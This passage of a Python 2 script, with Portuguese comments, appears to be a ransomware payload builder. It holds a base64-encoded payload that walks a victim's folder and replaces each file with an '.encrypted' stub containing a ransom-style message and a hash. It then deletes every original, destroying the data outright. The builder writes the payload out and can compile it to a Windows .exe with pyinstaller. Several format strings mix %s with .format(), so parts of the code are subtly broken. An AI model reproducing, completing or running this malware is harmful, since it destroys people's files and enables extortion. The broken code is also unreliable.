ycXVpdm9zIGUgc3VicGFzdGFzIGRvIHBhdGgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCWZsYWcgPSBwYXRocysiLyIrZmlsZSAjIGxpc3RhIHRvZG9zIG9zIGFycXVpdm9zIGUgc3VicGFzdGFzIGRvIHBhdGgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgIlsrXSBFbmNyeXB0IDogJXMiJShmbGFnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCQloYW5kbGVyID0gb3BlbihmbGFnLCAicmIiKSAjIGxlciBvIGNvbnRldWRvIGRlIHRvZG9zIG9zIGFycXVpdm9zDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCWV4Y2VwdCBJT0Vycm9yOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAkJcGFzcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGVudCA9IGhhbmRsZXIucmVhZCgpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBNZW1vcnlFcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50ID0gImRhdGEiICMgc2UgbyBhcnF1aXZvIGZvciBtdWl0byBncmFuZGUsIG8gY29udGV1ZG8gcmVjZWJlICJkYXRhIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmNyeXB0ID0gIlsrXSBZb3VyIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB0ZWQgOiAiICsgaGFzaGxpYi5zaGE1MTIoY29udGVudCkuaGV4ZGlnZXN0KCkgIyBjaGF2ZSBkZSBjcmlwdG9ncmFmaWEgdXNhZGEgc2hhNTEyDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5ld19maWxlcyA9IG9wZW4oZmxhZy5zcGxpdCgiLiIpWzBdK2hhc2hsaWIubWQ1KHRpbWUuY3RpbWUoKSkuaGV4ZGlnZXN0KCkrIi5lbmNyeXB0ZWQiLCAid2IiKSAjIGNyaWEgb3Mgbm92b3MgYXJxdWl2b3MgY3JpcHRvZ3JhZmFkb3MNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmV3X2ZpbGVzLndyaXRlKGVuY3J5cHQpICMgZXNjcmV2ZSBvcyBub3ZvcyBhcnF1aXZvcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBoYW5kbGVyLmNsb3NlKCkgIyBmZWNoYSBvcyBhcnF1aXZvcyBvcmlnaW5haXMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmV3X2ZpbGVzLmNsb3NlKCkgIyBmZWNoYSBvcyBub3ZvcyBhcnF1aXZvcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoZmxhZykgIyByZW1vdmUgb3MgYXJxdWl2b3Mgb3JpZ2luYWlzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMC41KSAjIGVzcGVyYSAwLjUgc2VndW5kb3MsIHBhcmEgZGFyIG1haXMgZXN0YWJpbGlkYWRlIGFvIHByb2dyYW1hDQogICAgICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpICMgbGltYSBvIGNhY2hlDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgbmFtZV9zY3JpcHQgPSBzeXMuYXJndlswXS5zcGxpdCgiXFwiKSAjIG5vbWUgZG8gc2NyaXB0DQogICAgICAgICAgICAgICAgbmFtZSA9IG5hbWVfc2NyaXB0W2xlbihuYW1lX3NjcmlwdCkgLSAxXQ0KICAgICAgICAgICAgICAgIHByaW50ICJcblsrXSBVc2FnZSA6ICVzIHBhdGhfdG9fZW5jcnlwdCIlKG5hbWUpICMgYmFubmVyDQogICAgICAgICAgICAgICAgcHJpbnQgIlsrXSBFeGFtcGxlIDogJXMgQzpcXFVzZXJzXFx2aWN0aW1cXERvY3VtZW50cyIlKG5hbWUpDQogICAgICAgICAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpDQogICAgICAgICAgICAgICAgc3lzLmV4aXQoKQ0KZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAgICAgICBwcmludCAiXG5bWF0gU2FpbmRvIC4uLiINCiAgICAgICAgc3lzLmV4aXQoKSAjIHNhaSBzZSBhcGVydGFyIEN0cmwrYw=="
			print ""
			quest_compile = raw_input("[?] Do you want compiling to .exe [Y/N] : ")
			print "\n"
			if quest_compile == "N" or quest_compile == "n":
				payload_coded = "exec('%s').decode('base64')".format(code)
				payload_file = open(name, 'w') # abri o arquivo dst
				payload_file.write(payload_coded)
				payload_file.close() # fecha o arquivo
				name_of_payload = name.split(".")[0]
			else:
				payload_coded = code.decode("base64")
				payload_file = open(name, 'w') # abri o arquivo dst
				payload_file.write(payload_coded)
				payload_file.close() # fecha o arquivo
				name_of_payload = name.split(".")[0]
				cmd_ = os.popen("pyinstaller -h")
				if not "usage:" in cmd_.read():
					os.system("pip install pyinstaller")
				else:
					os.system("pyinstaller %s".format(name))
					if self.platform == "Windows":
						os.system("powershell rm -r build")
						os.system("del %s.spec".format(name_of_payload))
						os.system("cd dist/ && powershell mv %s ../compiled/".format(name_of_payload))
						os.system("powershell rm -r dist")
						os.system("cls")
					elif self.platform == "Linux":
						os.system("rm -r build && rm %s.spec && mv %s ../compiled/".format(name_of_payload, name_of_payload))
						os.system("clear")
			size_payload = os.path.getsize(name) # tamanho do payload
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Payload was created ! \n", "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Name : %s ".format(name), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			sys.stdout.write(colored("Size : %i bytes ".format(size_payload), "white"))
			sys.stdout.write(colored("\n[+] ", "green"))
			if quest_compile == "N" or quest_compile == "n":
				sys.stdout.write(colored("Path : compiled/%s\n".format(name), "white"))
			else:
				sys.stdout.write(colored("Path : compiled/%s/%s.exe\n".format(name_of_payload,name_of_payload), "white"))
			if self.platform == "Windows":
				if quest_compile == "N" or quest_compile == "n":
					os.system('@echo off && move "%s" "compiled/%s" > null && del null'.format(name=name)) # move o arquivo para a pasta compiled
				else:
					os.system("del %s".format(name))
			elif self.platform == "Linux":
				if quest_compile == "N" or quest_compile == "n":
					os.system("mv {name} compiled/{name}".format(name=name)) # move o arquivo para a pasta compiled
				else:
					os.system("rm %s".format(name))
